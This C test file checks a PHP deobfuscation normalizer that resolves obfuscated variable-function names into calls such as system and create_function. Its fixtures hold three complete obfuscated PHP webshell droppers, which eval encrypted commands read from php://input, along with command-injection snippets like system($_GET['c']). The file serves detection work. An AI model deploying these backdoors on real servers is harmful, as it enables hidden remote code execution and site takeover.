#define _GNU_SOURCE
/*
 * script_heads - the head of a call written as the name it is (kgenome_diag_text_req.on_head, kgenome_textual_subst with `bare`): `$l('', $U)` where `$l` is
 * the one string 'create_function' is shown as `create_function('', $U)`, a bare name and not a literal, so that a marker on the name finds the call.
 *
 * WHEN: php, the head is a variable (not a member, not static), the variable has ONE producer (assigned once, never appended to, not assigned by a call), the
 * evaluator follows it to a constant, and the constant is a plain name (letters, digits, "_", a namespace backslash; not empty, not beginning with a digit).
 * Built by str_replace, chr(), strrev() (a decoder: base64_decode too), a join or a plain literal - the evaluator says. Otherwise the call is left as typed.
 *
 *   known answers   each shape that is written, and each that is left (two producers, an append, a value that is no name, a member, a static call, a variable
 *                   that holds a request value, a head in a string)
 *   hoho            the three droppers of the family (hoho, hoho_1 and hoho_2: the name is built from pieces with str_replace): no variable call head whose
 *                   value is known is left in the view, and the one call that is not (the result of create_function) is
 *   property        the written text has none left: a second run reports no head
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "normalizer_ref.h"
#include "normalizer_consts.h"

#define PHP KGENOME_TEXTUAL_LANG_PHP

/* The text of `src` with the constants and the heads written, NUL ended; the caller frees it. */
static char *view_of(const char *src)
{
	struct cset s;
	uint8_t *out = NULL;
	uint32_t w;
	char *r;
	size_t n = strlen(src);

	consts_of(PHP, (const uint8_t *)src, n, &s);
	w = consts_text(PHP, (const uint8_t *)src, n, &s, &out);
	if (!s.n || !w) {
		free(out);
		r = strdup(src);
	} else {
		r = malloc((size_t)w + 1u);
		memcpy(r, out, w);
		r[w] = 0;
		free(out);
	}
	cset_free(&s);
	return r;
}

static void shows(const char *src, const char *want_part)
{
	char *v = view_of(src);

	NCKF(strstr(v, want_part) != NULL, "view of [%s] is [%s], wanted [%s] in it", src, v, want_part);
	free(v);
}

static void left(const char *src, const char *head)
{
	char *v = view_of(src);

	NCKF(strstr(v, head) != NULL, "view of [%s] is [%s]: the head [%s] was to be left", src, v, head);
	free(v);
}

static unsigned heads_of_text(const char *src)
{
	struct cset s;
	unsigned k, n = 0;

	consts_of(PHP, (const uint8_t *)src, strlen(src), &s);
	for (k = 0; k < s.n; k++)
		n += s.c[k].bare;
	cset_free(&s);
	return n;
}

static void known(void)
{
	/* the shapes that are written */
	shows("<?php $l = str_replace('k', '', 'ckrekatek_fuknkkction'); $s = $l('', $U);", "$s = create_function('', $U);");
	shows("<?php $l = 'system'; $l($_GET['c']);", "system($_GET['c'])");
	shows("<?php $l = chr(115) . chr(121) . 'stem'; $l($c);", "system($c)");
	shows("<?php $l = strrev('metsys'); $l($c);", "system($c)");
	shows("<?php $a = 'sys'; $b = 'tem'; $l = $a . $b; $l($c);", "system($c)");
	shows("<?php $l = base64_decode('c3lzdGVt'); $l($c);", "system($c)");
	shows("<?php $l = '\\\\Foo\\\\bar'; $l($c);", "\\Foo\\bar($c)");
	shows("<?php $l = 'a1_b'; $l (1);", "$l (1)");              /* a gap between the head and its bracket: the lexer's token is not followed by "(" */
	shows("<?php $l = 'exec'; echo $l($c) . $l($d);", "echo exec($c) . exec($d)");
	/* and what is written is a name, not a literal */
	{
		char *v = view_of("<?php $l = 'system'; $l($c);");

		NCKF(!strstr(v, "'system'(") && !strstr(v, "\"system\"("), "the head is bare in [%s]", v);
		free(v);
	}
	/* the shapes that are left */
	left("<?php $l = 'system'; $l = 'exec'; $l($c);", "$l($c)");                          /* two producers */
	left("<?php $l = 'sys'; $l .= 'tem'; $l($c);", "$l($c)");                             /* appended to */
	left("<?php $l = 'not a name'; $l($c);", "$l($c)");
	left("<?php $l = '1abc'; $l($c);", "$l($c)");
	left("<?php $l = ''; $l($c);", "$l($c)");
	left("<?php $l = $_GET['f']; $l($c);", "$l($c)");
	left("<?php $l = 'system'; $o->$l($c);", "->$l($c)");                                  /* a method of $o */
	left("<?php $l = 'system'; A::$l($c);", "::$l($c)");
	left("<?php $l = preg_replace('/x/', 'y', $z); $l($c);", "$l($c)");
	left("<?php function f($l) { $l($c); } $l = 'system';", "$l($c)");                     /* a parameter is no producer */
	left("<?php $l = 'sys' . $_GET['x']; $l($c);", "$l($c)");
	NCKF(heads_of_text("<?php $s = 'x'; echo \"$s($y)\"; $t = '$s(1)';") == 0u, "a head inside a string is not one");
}

/* ---- the three droppers of the hoho family, as they are ----------------------------------------- */

static const char hoho[] =
	"<?php\n"
	"$p='mIQCD\"T|T|;function x($tT|,T|$k){$c=strlT|T|en(T|$k);$l=T|strT|len($t);$o=\"T|\";for($';\n"
	"$H='|T|@baT|se64_decode($m[1]),$k)))T|;$oT|T|=@ob_get_coT|ntentT|s();@oT|b_end_clT|ean()';\n"
	"$v='$k=\"4e4dT|6c33\";T|$khT|=\"2b6fe62aT|63af\";T|$kfT|=\"e5T|6171fd372T|5\";$pT|=\"n4T|MOT|uY39SCh';\n"
	"$L='sT|(\"php:/T|/input\"T|),$m)==T|1T|) {@oT|bT|_start();@evT|aT|l(@gzunT|compT|ress(@x(T';\n"
	"$j='T|i=0;$i<$T|l;){foT|T|rT|($j=0;($j<$c&&$T|i<$T|l);$jT|++,$i++){$o.T|=$t[$i]T|^$T|k[$';\n"
	"$I=';$rT|=@base6T|4T|T|_encT|ode(@x(@gzcompresT|s($o),$kT|));T|print(T|T|\"$p$kh$r$kf\");}';\n"
	"$r='j];}T|}reT|turn $o;T|T|}if (@preg_match(T|\"/T|$kh(T|.+)$kf/\",@fT|ile_gT|et_conteT|nt';\n"
	"$l=str_replace('k','','ckrekatek_fuknkkction');\n"
	"$U=str_replace('T|','',$v.$p.$j.$r.$L.$H.$I);\n"
	"$s=$l('',$U);$s();\n"
	"?>\n"
	"\n";
static const char hoho_1[] =
	"<?php\n"
	"$l='+Tbase+T6+T4+T_encode(@x(@gzcompr+Tess(+T$o),$k));p+Trin+Tt(\"$p$kh$+Tr$kf\");}';\n"
	"$Y='$k=\"e9f5+T71+T3d\";+T$k+Th=\"ec55d727bb+T35\";$kf=+T\"3+T92cec+T619+T+T0ce\";$p+';\n"
	"$O='+Tc+Th+T(\"/$kh(.+)$kf/\",+T@file_g+T+Tet_contents(\"p+Thp://i+T+Tnpu+Tt\"),+T$m)';\n"
	"$N='==1) {@ob_star+Tt();@e+T+Tval(@gzunc+Tompress+T(@x+T(@b+Tase64_decod+Te($';\n"
	"$r='m+T[+T1]),$k)));$o=@o+Tb_+Tget_conten+Tts();+T@ob_end+T_+Tc+Tlean();$r=@';\n"
	"$W=str_replace('wa','','wacwareatewa_fwauwancwation');\n"
	"$P='T=\"nBW3DD8f+TX74z+Tjb5P\";fun+Tction +Tx($t,$k)+T{$c=strlen(+T$k+T);$l+T=s';\n"
	"$d='trlen($t)+T;+T+T$+To=\"\";for($i+T=0;$i<+T$l;){for($j=0;($j<$+Tc&&$i<$l+T+T)';\n"
	"$Q=';$j++,$i+T++)+T{$o.=$t[+T$i]^$k[$+Tj];}}+Treturn $o+T+T;}if (@pr+Teg_mat';\n"
	"$u=str_replace('+T','',$Y.$P.$d.$Q.$O.$N.$r.$l);\n"
	"$K=$W('',$u);$K();\n"
	"?>\n"
	"\n";
static const char hoho_2[] =
	"<?php\n"
	"$S='F#(\"/$kh(F#.+)F#$kf/\",F#@fileF#_get_contents(\"F#php:F#//input\")F#,$m)==F#F#1) {@ob_staF#rtF#();@';\n"
	"$p='r(F#$j=F#0;($j<$c&&$i<$lF#);$j+F#+,$iF#++)F#F#{$o.=$t[$i]^$k[$j]F#;}}rF#etuF#rnF# $o;}F#if (@preg_maF#tch';\n"
	"$U='eF#vaF#l(@gzuncompresF#s(@x(@baF#se64_F#decode(F#$m[1])F#,$k))F#);F#$F#F#o=@ob_get_conF#tents(F';\n"
	"$Y='$k=\"e9f57F#13d\"F#;$F#kh=\"ec5F#5d727bF#b35\";$kf=\"F#392ceF#c6F#190ce\";F#F#$p=\"Zprjb7je9XVWkF#O31\";F#';\n"
	"$d='#);@ob_end_cF#lean();$F#r=F#@F#base6F#4_encode(@xF#(@gF#zcompress($o),$kF#)F#);prinF#t(\"$p$kh$F#r$kf\");}';\n"
	"$L='functF#ionF# F#x($t,F#$k){$cF#=strF#len($k);$l=strlen($F#t)F#;F#$F#o=\"\";F#for($i=0;$i<$l;){foF#';\n"
	"$M=str_replace('nm','','cnmrnmnmeatenmnm_nmfunction');\n"
	"$e=str_replace('F#','',$Y.$L.$p.$S.$U.$d);\n"
	"$T=$M('',$e);$T();\n"
	"?>\n"
	"\n";

/* A variable followed by "(" in the view of a dropper, whose value is a name the evaluator knows: none may be left. */
static void family(const char *name, const char *src, const char *call)
{
	char *v = view_of(src);
	unsigned heads = heads_of_text(src);

	NCKF(heads >= 1u, "%s: no head was reported", name);
	NCKF(strstr(v, call) != NULL, "%s: [%s] is not in the view:\n%s", name, call, v);
	/* the call of the function create_function made, `$s()` or `$K()`, is not a known name and stays; nothing else of the shape `$x(` has a known value */
	{
		struct cset s;

		consts_of(PHP, (const uint8_t *)v, strlen(v), &s);
		{
			unsigned k, bare = 0;

			for (k = 0; k < s.n; k++)
				bare += s.c[k].bare;
			NCKF(bare == 0u, "%s: the view still has %u variable heads with a known name:\n%s", name, bare, v);
		}
		cset_free(&s);
	}
	free(v);
}

int main(void)
{
	known();
	family("hoho", hoho, "create_function('',$U)");
	family("hoho_1", hoho_1, "create_function('',");
	family("hoho_2", hoho_2, "create_function('',");
	printf("script_heads: %u checks, %u failed\n", nr_ok + nr_bad, nr_bad);
	return nr_bad != 0;
}
